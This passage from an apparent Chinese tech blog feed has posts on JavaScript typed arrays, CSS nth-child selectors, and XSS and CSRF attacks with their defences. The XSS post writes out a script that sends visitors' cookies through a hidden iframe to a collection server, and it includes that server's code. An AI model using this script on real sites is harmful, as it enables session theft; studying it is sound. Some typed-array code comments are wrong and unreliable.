<p>需要注意的是，TypedArray每种类型对应一种构造函数,所以说共有九种不同的构造函数。</p>
<p>我们还可以通过传入一个类数组或数组对象来初始化一个TypedArray，传入的对象将被TypedArray的内部实现生成ArrayBuffer实例。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> view = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</div><div class="line"><span class="built_in">console</span>.log(view[<span class="number">1</span>]); <span class="comment">// =&gt; 1</span></div></pre></td></tr></table></figure>
<h3 id="DataView视图"><a href="#DataView视图" class="headerlink" title="DataView视图"></a>DataView视图</h3><p>DataView与TypedArray不同主要有两点。<br>一个是DataView可以用不同的数据类型对一段ArrayBuffer进行读取，它可以帮助我们处理更复杂的数据。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">10</span>);</div><div class="line"></div><div class="line"><span class="keyword">const</span> view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</div><div class="line">view.getUint8(<span class="number">0</span>);  <span class="comment">// 从第1个字节读取一个8位无符号整数</span></div><div class="line">view.getUint16(<span class="number">0</span>);  <span class="comment">// 从第2个字节读取一个16位无符号整数</span></div></pre></td></tr></table></figure>
<p>还有一个更加重要的点是数据的读取方式。</p>
<p>在计算机中，存储数据有两种方式，分别是<strong>小端字节序</strong>和<strong>大端字节序</strong>。它们两个的区别是，在存储数据的时候，采小端字节序指低字节数据存放在内存低地址处，高字节数据存放在内存高地址处；大端字节序是高字节数据存放在低地址处，低字节数据存放在高地址处。比如说一个十六进制数<code>0x12345678</code>,在采用小端字节序的时候，就会被存储成为<code>0x78563412</code>。在个人电脑上，基本上都是采用小端字节序读取的，所以自然不会出现什么问题，但在一些网络设备上是采用大端字节序，那么数据传输到个人电脑上，就会被错误的解析，为了说明这个问题直接帖阮大神书上的一段比较具有说明性的代码：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 假定某段buffer包含如下字节 [0x02, 0x01, 0x03, 0x07]</span></div><div class="line">var buffer = new ArrayBuffer(<span class="number">4</span>);</div><div class="line">var v1 = new Uint8Array(buffer);</div><div class="line">v1[<span class="number">0</span>] = <span class="number">2</span>;</div><div class="line">v1[<span class="number">1</span>] = <span class="number">1</span>;</div><div class="line">v1[<span class="number">2</span>] = <span class="number">3</span>;</div><div class="line">v1[<span class="number">3</span>] = <span class="number">7</span>;</div><div class="line"></div><div class="line">var uInt16View = new Uint16Array(buffer);</div><div class="line"></div><div class="line"><span class="comment">// 计算机采用小端字节序,所以头两个字节等于258</span></div><div class="line">if (uInt16View[<span class="number">0</span>] === <span class="number">258</span>) &#123;</div><div class="line">  console.log('OK'); <span class="comment">// "OK"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 赋值运算</span></div><div class="line">uInt16View[<span class="number">0</span>] = <span class="number">255</span>;    <span class="comment">// 字节变为[0xFF, 0x00, 0x03, 0x07]</span></div><div class="line">uInt16View[<span class="number">0</span>] = <span class="number">0xff05</span>; <span class="comment">// 字节变为[0x05, 0xFF, 0x03, 0x07]</span></div><div class="line">uInt16View[<span class="number">1</span>] = <span class="number">0x0210</span>; <span class="comment">// 字节变为[0x05, 0xFF, 0x10, 0x02]</span></div></pre></td></tr></table></figure>
<p>所以为了解决这个问题，DataView可以指定数据的处理方式。<br>DataView实例上的getXXXX方法默认是使用大端字节序读取(为了和比较常见的小端字节序对对应)，如果要使用小端字节序的话，可以给第二个参数指定为<code>true</code>.<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">view.getUi<span class="symbol">nt16</span><span class="comment">(1, true)</span>; <span class="comment">// 小端字节序</span></div><div class="line">view.getUi<span class="symbol">nt16</span><span class="comment">(1, false)</span>;<span class="comment">// 大端字节序</span></div></pre></td></tr></table></figure></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这篇文章其实是我自己在学习二进制数组中的一些小笔记，有点零零散散，但是也基本记录了我学习过程中遇到的一些疑惑和难点。写的时候也查阅了一下资料，发现，现有的一些关于二进制数组的介绍还不够深入，在日后的学习过程中，如果有更加深刻的体会再做更新。</p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul>
<li><a href="http://es6.ruanyifeng.com/#docs/arraybuffer" target="_blank" rel="external">二进制数组</a></li>
<li><a href="http://www.ecma-international.org/ecma-262/6.0/#sec-typedarray-objects" target="_blank" rel="external">TypedArray Objects</a></li>
<li><a href="http://www.cnblogs.com/xiehy/archive/2010/11/25/1887779.html" target="_blank" rel="external">小端字节序与大端字节序</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近了解下了解关于&lt;code&gt;Web Audio API&lt;/code&gt;相关的知识，其中就包括音频数据的传输和解析音频数据。在现代浏览器中，许多规范都制定出了对二进制数据处理的接口，我们可以很方便的用这些接口得到最原始的数据，诸如：FileReader、WebGL等。都需要对大量的原始数据进行处理，为了加快对于这些原始数据处理速度，提升性能，于是乎，在最新的ECMAScript6的规范中就推出了&lt;code&gt;二进制数组&lt;/code&gt;来提高浏览器对二进制数据的处理能力,这也大大的提高了JS对数据的处理能力。&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>CSS3 的nth-child和nth-of-type</title>
    <link href="http://summerGreenTea.github.io/2016/03/27/css3-selector-nth-child-and-nth-of-child/"/>
    <id>http://summerGreenTea.github.io/2016/03/27/css3-selector-nth-child-and-nth-of-child/</id>
    <published>2016-03-27T06:48:40.000Z</published>
    <updated>2016-05-28T13:23:04.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>nth-child</code> 和 <code>nth-of-type</code>长得差不多，在表现上其实有的时候很难分辨清楚，我自己也遇到不少这样的坑！话说CSS3对选择选择器的扩充可是一大亮点，细细琢磨会发现有许多灵活的运用场景。在看完张鑫旭大神的<a href="http://www.zhangxinxu.com/wordpress/2011/06/css3%E9%80%89%E6%8B%A9%E5%99%A8nth-child%E5%92%8Cnth-of-type%E4%B9%8B%E9%97%B4%E7%9A%84%E5%B7%AE%E5%BC%82/" target="_blank" rel="external">CSS3选择器:nth-child和:nth-of-type之间的差异</a>，真的是深有感触，于是，趁自己的又激动又感动的时候，写篇博客吧！<br><a id="more"></a></p>
<h3 id="代码开路"><a href="#代码开路" class="headerlink" title="代码开路"></a>代码开路</h3><p>HTML结构:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></div><div class="line">	<span class="selector-tag">p</span><span class="selector-pseudo">:nth-child(1)</span> &#123;</div><div class="line">		<span class="attribute">color</span>: red;</div><div class="line">	&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span> this is element p <span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span> this is element p <span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span> this is element p <span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>CSS样式:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:nth-child(1)</span> &#123;</div><div class="line">	<span class="attribute">color</span>: red;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<img src="/2016/03/27/css3-selector-nth-child-and-nth-of-child/pic1.png" alt="1.1" title="1.1">
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:nth-of-type(1)</span> &#123;</div><div class="line">	<span class="attribute">color</span>: red;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<img src="/2016/03/27/css3-selector-nth-child-and-nth-of-child/pic2.png" alt="1.2" title="1.2">
<p>我们会发现两个例子的第一个p标签的文字都变红了，看出什么”端倪”没？当然看不出来了，根本就没端倪。接着上代码。这次我们把HTML结构修改下。<br>HTML结构:<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;div&gt;</div><div class="line">	&lt;div&gt;<span class="keyword">this</span> <span class="keyword">is</span> element div&lt;/div&gt;</div><div class="line">	&lt;p&gt; <span class="keyword">this</span> <span class="keyword">is</span> element p &lt;/p&gt;</div><div class="line">	&lt;p&gt; <span class="keyword">this</span> <span class="keyword">is</span> element p &lt;/p&gt;</div><div class="line">	&lt;p&gt; <span class="keyword">this</span> <span class="keyword">is</span> element p &lt;/p&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure></p>
<p>CSS样式:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:nth-child(1)</span> &#123;</div><div class="line">	<span class="attribute">color</span>: red;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<img src="/2016/03/27/css3-selector-nth-child-and-nth-of-child/pic3.png" alt="1.3" title="1.3">
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:nth-of-type(1)</span> &#123;</div><div class="line">	<span class="attribute">color</span>: red;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<img src="/2016/03/27/css3-selector-nth-child-and-nth-of-child/pic4.png" alt="1.4" title="1.4">
<h3 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h3><p>这下看出来了吧！下面就来分析这几段代码产生这些结果的原因。<br>当我们使用<code>p:nth-child(1)</code>的时候，就有如下匹配规则:</p>
<ol>
<li>找到所有P元素的父元素</li>
<li>找到这些父元素中的第一个子元素是p元素的元素</li>
<li>为这个p元素匹配该CSS规则<br>我们把重点放在父元素的<em> 父元素中的第一个子元素是p元素的元素 </em>上。</li>
</ol>
<p>当我们使用<code>p:nth-of-type(1)</code>的时候，就有如下匹配规则:</p>
<ol>
<li>找到所有p元素的父元素</li>
<li>找到每个父元素中的所有p元素中第一个元素类型是p元素类型的元素</li>
<li>为这个p元素匹配该CSS规则</li>
</ol>
<p>这次我们重点关注 <em>父元素中的所有p元素中第一个p元素类型元素</em> 。</p>
<p>我在学习这两个选择器的时候分析到这里其实思维上有点乱了，我对CSS3的这类选择器的匹配规则的理解是，在原先的基础上加上了一系列的<em> 限制规则 </em>，这些限制规则不同于<code>p.error</code>或<code>p[title=&#39;name&#39;]</code>，它是在位置(出现位置上)、类型(元素类型)有了精确的限制，于此同时，又增加了<code>a[src^=&quot;https&quot;]</code>、<code>a[src$=&quot;.pdf&quot;]</code>等模糊条件的精确匹配，所以CSS3选择器是一种 <em> 广度 </em> 上对CSS选择器的扩充。</p>
<p>说到了这里，其实也不过就是借别人的光来照亮自己，那么我自己在实践这些选择器的时候发现了一些很容易忽视的点，也是理解不到位容易造成错误的点，上代码。</p>
<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;div&gt;</div><div class="line">    &lt;div class=&quot;item&quot;&gt;this is element div&lt;/div&gt;</div><div class="line">	&lt;p class=&quot;item&quot;&gt; this is element p &lt;/p&gt;</div><div class="line">	&lt;p class=&quot;item&quot;&gt; this is element p &lt;/p&gt;</div><div class="line">	&lt;p class=&quot;item&quot;&gt; this is element p &lt;/p&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">.item:nth-of-type(1) &#123;</div><div class="line">  color: red;</div><div class="line">  background: black;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在这里肯定一部分人会认为<code>div.item</code>的背景是黑色的，字体是红色的。看结果:</p>
<img src="/2016/03/27/css3-selector-nth-child-and-nth-of-child/pic5.png" alt="1.5" title="1.5">
<p>我的天呐！关键的点就在于那个选择器<code>*-type</code>，中文翻译为类型。也就是我上面提到的<em> 父元素中的所有p元素中第一个p元素类型元素 </em>。也就是说，浏览器首先匹配<code>.item</code>在匹配<code>.item</code>的类型，再找出每个类型中的第一个子元素应用样式。<br>那么如果是<code>nth-child(1)</code>的话，那么上面只有<code>div.item</code>会运用背景黑色字体红色的样式，原因只要稍作比较就可得出。</p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>其实在CSS3提供的伪类选择器中，有一部分也与上述情况相似，再这也就不一一叙述了，读者可顺着相应的思路去思考实践即可。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;nth-child&lt;/code&gt; 和 &lt;code&gt;nth-of-type&lt;/code&gt;长得差不多，在表现上其实有的时候很难分辨清楚，我自己也遇到不少这样的坑！话说CSS3对选择选择器的扩充可是一大亮点，细细琢磨会发现有许多灵活的运用场景。在看完张鑫旭大神的&lt;a href=&quot;http://www.zhangxinxu.com/wordpress/2011/06/css3%E9%80%89%E6%8B%A9%E5%99%A8nth-child%E5%92%8Cnth-of-type%E4%B9%8B%E9%97%B4%E7%9A%84%E5%B7%AE%E5%BC%82/&quot;&gt;CSS3选择器:nth-child和:nth-of-type之间的差异&lt;/a&gt;，真的是深有感触，于是，趁自己的又激动又感动的时候，写篇博客吧！&lt;br&gt;
    
    </summary>
    
    
      <category term="CSS3" scheme="http://summerGreenTea.github.io/tags/CSS3/"/>
    
  </entry>
  
  <entry>
    <title>总结 XSS 与 CSRF 两种跨站攻击</title>
    <link href="http://summerGreenTea.github.io/2016/03/23/introduce-to-XSS-and-CSRF/"/>
    <id>http://summerGreenTea.github.io/2016/03/23/introduce-to-XSS-and-CSRF/</id>
    <published>2016-03-23T10:08:34.000Z</published>
    <updated>2016-03-23T11:13:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>在那个年代，大家一般用拼接字符串的方式来构造动态 SQL 语句创建应用，于是 SQL 注入成了很流行的攻击方式。在这个年代， 参数化查询 已经成了普遍用法，我们已经离 SQL 注入很远了。但是，历史同样悠久的 XSS 和 CSRF 却没有远离我们。由于之前已经对 XSS 很熟悉了，所以我对用户输入的数据一直非常小心。如果输入的时候没有经过 Tidy 之类的过滤，我一定会在模板输出时候全部转义。所以个人感觉，要避免 XSS 也是很容易的，重点是要“小心”。但最近又听说了另一种跨站攻击 CSRF ，于是找了些资料了解了一下，并与 XSS 放在一起做个比较。<br><a id="more"></a></p>
<p><em>本文转自: <a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/" target="_blank" rel="external">https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/</a></em></p>
<h3 id="XSS：脚本中的不速之客"><a href="#XSS：脚本中的不速之客" class="headerlink" title="XSS：脚本中的不速之客"></a>XSS：脚本中的不速之客</h3><p>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。<br>运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</div><div class="line">    alert(<span class="string">"你关不掉我~"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="string">"""</span></div><div class="line">跨站脚本注入的信息收集服务器</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> bottle</div><div class="line">app = bottle.Bottle()</div><div class="line">plugin = bottle.ext.sqlite.Plugin(dbfile=<span class="string">'/var/db/myxss.sqlite'</span>)</div><div class="line">app.install(plugin)</div><div class="line"><span class="meta">@app.route('/myxss/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(cookies, db)</span>:</span></div><div class="line">    SQL = <span class="string">'INSERT INTO "myxss" ("cookies") VALUES (?)'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        db.execute(SQL, cookies)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
<p>然后在某一个页面的评论中注入这段代码:</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt; 包起来放在评论中</span></div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="built_in">window</span>, <span class="built_in">document</span></span>) </span>&#123;</div><div class="line">    <span class="comment">// 构造泄露信息用的 URL</span></div><div class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</div><div class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</div><div class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</div><div class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></div><div class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</div><div class="line">    hideFrame.height = <span class="number">0</span>;</div><div class="line">    hideFrame.width = <span class="number">0</span>;</div><div class="line">    hideFrame.style.display = <span class="string">"none"</span>;</div><div class="line">    hideFrame.src = xssURI;</div><div class="line">    <span class="comment">// 开工</span></div><div class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</div><div class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</div></pre></td></tr></table></figure>
<p>于是每个访问到含有该评论的页面的用户都会遇到麻烦——他们不知道背后正悄悄的发起了一个请求，是他们所看不到的。而这个请求，会把包含了他们的帐号和其他隐私的信息发送到收集服务器上。<br>我们知道 AJAX 技术所使用的 XMLHttpRequest 对象都被浏览器做了限制，只能访问当前域名下的 URL，所谓不能“跨域”问题。这种做法的初衷也是防范 XSS，多多少少都起了一些作用，但不是总是有用，正如上面的注入代码，用 iframe 也一样可以达到相同的目的。甚至在愿意的情况下，我还能用 iframe 发起 POST 请求。当然，现在一些浏览器能够很智能地分析出部分 XSS 并予以拦截，例如新版的 Firefox、Chrome 都能这么做。但拦截不总是能成功，何况这个世界上还有大量根本不知道什么是浏览器的用户在用着可怕的 IE6。从原则上将，我们也不应该把事关安全性的责任推脱给浏览器，所以防止 XSS 的根本之道还是过滤用户输入。用户输入总是不可信任的，这点对于 Web 开发者应该是常识。<br>正如上文所说，如果我们不需要用户输入 HTML 而只想让他们输入纯文本，那么把所有用户输入进行 HTML 转义输出是个不错的做法。似乎很多 Web 开发框架、模版引擎的开发者也发现了这一点，Django 内置模版和 Jinja2 模版总是默认转义输出变量的。如果没有使用它们，我们自己也可以这么做。PHP 可以用 htmlspecialchars 函数，Python 可以导入 cgi 模块用其中的 cgi.escape 函数。如果使用了某款模版引擎，那么其必自带了方便快捷的转义方式。<br>真正麻烦的是，在一些场合我们要允许用户输入 HTML，又要过滤其中的脚本。Tidy 等 HTML 清理库可以帮忙，但前提是我们小心地使用。仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。对于复杂的情况，我个人更倾向于使用简单的方法处理，简单的方法就是白名单重新整理。用户输入的 HTML 可能拥有很复杂的结构，但我们并不将这些数据直接存入数据库，而是使用 HTML 解析库遍历节点，获取其中数据（之所以不使用 XML 解析库是因为 HTML 要求有较强的容错性）。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。这样可以确保万无一失——如果用户的某种复杂输入不能为解析器所识别（前面说了 HTML 不同于 XML，要求有很强的容错性），那么它不会成为漏网之鱼，因为白名单重新整理的策略会直接丢弃掉这些未能识别的部分。最后获得的新 HTML 元素树，我们可以拍胸脯保证——所有的标签、属性都来自白名单，一定不会遗漏。<br>现在看来，大多数 Web 开发者都了解 XSS 并知道如何防范，往往大型的 XSS 攻击（包括前段时间新浪微博的 XSS 注入）都是由于疏漏。我个人建议在使用模版引擎的 Web 项目中，开启（或不要关闭）类似 Django Template、Jinja2 中“默认转义”（Auto Escape）的功能。在不需要转义的场合，我们可以用类似 的方式取消转义。这种白名单式的做法，有助于降低我们由于疏漏留下 XSS 漏洞的风险。<br>另外一个风险集中区域，是富 AJAX 类应用（例如豆瓣网的阿尔法城）。这类应用的风险并不集中在 HTTP 的静态响应内容，所以不是开启模版自动转义能就能一劳永逸的。再加上这类应用往往需要跨域，开发者不得不自己打开危险的大门。这种情况下，站点的安全非常 依赖开发者的细心和应用上线前有效的测试。现在亦有不少开源的 XSS 漏洞测试软件包（似乎有篇文章提到豆瓣网的开发也使用自动化 XSS 测试），但我都没试用过，故不予评价。不管怎么说，我认为从用户输入的地方把好关总是成本最低而又最有效的做法。</p>
<h3 id="CSRF：冒充用户之手"><a href="#CSRF：冒充用户之手" class="headerlink" title="CSRF：冒充用户之手"></a>CSRF：冒充用户之手</h3><p>起初我一直弄不清楚 CSRF 究竟和 XSS 有什么区别，后来才明白 CSRF 和 XSS 根本是两个不同维度上的分类。XSS 是实现 CSRF 的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF。<br>CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”。看起来有点相似，它们都是属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户，但前面说了，它们的攻击类型是不同维度上的分 类。CSRF 顾名思义，是伪造请求，冒充用户在站内的正常操作。我们知道，绝大多数网站是通过 cookie 等方式辨识用户身份（包括使用服务器端 Session 的网站，因为 Session ID 也是大多保存在 cookie 里面的），再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。<br>严格意义上来说，CSRF 不能分类为注入攻击，因为 CSRF 的实现途径远远不止 XSS 注入这一条。通过 XSS 来实现 CSRF 易如反掌，但对于设计不佳的网站，一条正常的链接都能造成 CSRF。<br>例如，一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL 并访问：</p>
<pre><code>http://example.com/bbs/create_post.php?title=标题&amp;content=内容
</code></pre><p>那么，我只需要在论坛中发一帖，包含一链接：</p>
<pre><code>http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈
</code></pre><p>只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。可能这只是个恶作剧，但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。<br>如何解决这个问题，我们是否可以效仿上文应对 XSS 的做法呢？过滤用户输入， 不允许发布这种含有站内操作 URL 的链接。这么做可能会有点用，但阻挡不了 CSRF，因为攻击者可以通过 QQ 或其他网站把这个链接发布上去，为了伪装可能还使用 bit.ly 压缩一下网址，这样点击到这个链接的用户还是一样会中招。所以对待 CSRF ，我们的视角需要和对待 XSS 有所区别。CSRF 并不一定要有站内的输入，因为它并不属于注入攻击，而是请求伪造。被伪造的请求可以是任何来源，而非一定是站内。所以我们唯有一条路可行，就是过滤请求的 处理者。<br>比较头痛的是，因为请求可以从任何一方发起，而发起请求的方式多种多样，可以通过 iframe、ajax（这个不能跨域，得先 XSS）、Flash 内部发起请求（总是个大隐患）。由于几乎没有彻底杜绝 CSRF 的方式，我们一般的做法，是以各种方式提高攻击的门槛。<br>首先可以提高的一个门槛，就是改良站内 API 的设计。对于发布帖子这一类创建资源的操作，应该只接受 POST 请求，而 GET 请求应该只浏览而不改变服务器端资源。当然，最理想的做法是使用 REST 风格 的 API 设计，GET、POST、PUT、DELETE 四种请求方法对应资源的读取、创建、修改、删除。现在的浏览器基本不支持在表单中使用 PUT 和 DELETE 请求方法，我们可以使用 ajax 提交请求（例如通过 jquery-form 插件，我最喜欢的做法），也可以使用隐藏域指定请求方法，然后用 POST 模拟 PUT 和 DELETE （Ruby on Rails 的做法）。这么一来，不同的资源操作区分的非常清楚，我们把问题域缩小到了非 GET 类型的请求上——攻击者已经不可能通过发布链接来伪造请求了，但他们仍可以发布表单，或者在其他站点上使用我们肉眼不可见的表单，在后台用 js 操作，伪造请求。<br>接下来我们就可以用比较简单也比较有效的方法来防御 CSRF，这个方法就是“请求令牌”。读过《J2EE 核心模式》的同学应该对“同步令牌”应该不会陌生，“请求令牌”和“同步令牌”原理是一样的，只不过目的不同，后者是为了解决 POST 请求重复提交问题，前者是为了保证收到的请求一定来自预期的页面。实现方法非常简单，首先服务器端要以某种策略生成随机字符串，作为令牌（token）， 保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登陆验证身份。<br>请求令牌虽然使用起来简单，但并非不可破解，使用不当会增加安全隐患。使用请求令牌来防止 CSRF 有以下几点要注意：</p>
<ul>
<li>虽然请求令牌原理和验证码有相似之处，但不应该像验证码一样，全局使用一个 Session Key。因为请求令牌的方法在理论上是可破解的，破解方式是解析来源页面的文本，获取令牌内容。如果全局使用一个 Session Key，那么危险系数会上升。原则上来说，每个页面的请求令牌都应该放在独立的 Session Key 中。我们在设计服务器端的时候，可以稍加封装，编写一个令牌工具包，将页面的标识作为 Session 中保存令牌的键。</li>
<li>在 ajax 技术应用较多的场合，因为很有请求是 JavaScript 发起的，使用静态的模版输出令牌值或多或少有些不方便。但无论如何，请不要提供直接获取令牌值的 API。这么做无疑是锁上了大门，却又把钥匙放在门口，让我们的请求令牌退化为同步令牌。</li>
<li>第一点说了请求令牌理论上是可破解的，所以非常重要的场合，应该考虑使用验证码（令牌的一种升级，目前来看破解难度极大），或者要求用户再次输入密码（亚马逊、淘宝的做法）。但这两种方式用户体验都不好，所以需要产品开发者权衡。</li>
<li>无论是普通的请求令牌还是验证码，服务器端验证过一定记得销毁。忘记销毁用过的令牌是个很低级但是杀伤力很大的错误。我们学校的选课系统就有这个 问题，验证码用完并未销毁，故只要获取一次验证码图片，其中的验证码可以在多次请求中使用（只要不再次刷新验证码图片），一直用到 Session 超时。这也是为何选课系统加了验证码，外挂软件升级一次之后仍然畅通无阻。</li>
</ul>
<p>如下也列出一些据说能有效防范 CSRF，其实效果甚微的方式甚至无效的做法。</p>
<ul>
<li>通过 referer 判定来源页面：referer 是在 HTTP Request Head 里面的，也就是由请求的发送者决定的。如果我喜欢，可以给 referer 任何值。当然这个做法并不是毫无作用，起码可以防小白。但我觉得性价比不如令牌。</li>
